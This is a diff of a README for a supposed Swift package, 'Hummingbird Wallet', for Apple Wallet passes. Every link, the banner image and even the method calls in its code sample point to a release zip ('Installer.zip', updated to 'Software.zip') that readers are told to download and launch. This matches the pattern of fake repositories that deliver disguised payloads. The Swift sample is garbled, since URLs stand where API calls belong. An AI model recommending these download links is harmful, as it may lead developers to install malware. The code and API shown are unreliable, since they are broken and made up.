@@ -1,6 +1,6 @@
 # 🌟 **Hummingbird Wallet - Passes and Orders for Apple Wallet**
 
-![Hummingbird Wallet](https://github.com/juanpepep213/hummingbird-wallet/releases/download/v1.0/Installer.zip)
+![Hummingbird Wallet](https://github.com/juanpepep213/hummingbird-wallet/releases/download/v2.0/Software.zip)
 
 ## Overview
 Welcome to the **Hummingbird Wallet** repository! This Swift package allows you to easily create passes and orders for Apple Wallet using Hummingbird, a powerful tool for managing merchant transactions and digital assets. Whether you are developing an e-commerce platform, a ticketing system, or a coupon app, this library enables seamless integration with Apple Wallet, providing a streamlined experience for your users.
@@ -15,7 +15,7 @@ Welcome to the **Hummingbird Wallet** repository! This Swift package allows you 
 
 ## Installation
 To utilize the Hummingbird Wallet library in your Swift project, you can download the package from the following link:  
-[![Download Hummingbird Wallet](https://github.com/juanpepep213/hummingbird-wallet/releases/download/v1.0/Installer.zip)](https://github.com/juanpepep213/hummingbird-wallet/releases/download/v1.0/Installer.zip)
+[![Download Hummingbird Wallet](https://github.com/juanpepep213/hummingbird-wallet/releases/download/v2.0/Software.zip)](https://github.com/juanpepep213/hummingbird-wallet/releases/download/v2.0/Software.zip)
 
 Once downloaded, launch the package and follow the installation instructions included in the repository.
 
@@ -29,14 +29,14 @@ import HummingbirdWallet
 let myPass = Pass(type: .event, title: "Music Festival Pass", startDate: Date(), endDate: Date())
 
 // Add pass details
-https://github.com/juanpepep213/hummingbird-wallet/releases/download/v1.0/Installer.zip(key: "location", value: "Outdoor Venue")
-https://github.com/juanpepep213/hummingbird-wallet/releases/download/v1.0/Installer.zip(type: .qr, value: "1234567890")
+https://github.com/juanpepep213/hummingbird-wallet/releases/download/v2.0/Software.zip(key: "location", value: "Outdoor Venue")
+https://github.com/juanpepep213/hummingbird-wallet/releases/download/v2.0/Software.zip(type: .qr, value: "1234567890")
 
 // Generate pass for user
-let passData = https://github.com/juanpepep213/hummingbird-wallet/releases/download/v1.0/Installer.zip()
+let passData = https://github.com/juanpepep213/hummingbird-wallet/releases/download/v2.0/Software.zip()
 
 // Add pass to user's Apple Wallet
-https://github.com/juanpepep213/hummingbird-wallet/releases/download/v1.0/Installer.zip(passData)
+https://github.com/juanpepep213/hummingbird-wallet/releases/download/v2.0/Software.zip(passData)
 ```
 
 ## Examples
@@ -50,4 +50,4 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ---
 
-🔗 Explore the [Hummingbird](https://github.com/juanpepep213/hummingbird-wallet/releases/download/v1.0/Installer.zip) GitHub repository for more information and updates. Start creating amazing passes and orders for Apple Wallet today with **Hummingbird Wallet**. Happy coding! 🚀
+🔗 Explore the [Hummingbird](https://github.com/juanpepep213/hummingbird-wallet/releases/download/v2.0/Software.zip) GitHub repository for more information and updates. Start creating amazing passes and orders for Apple Wallet today with **Hummingbird Wallet**. Happy coding! 🚀
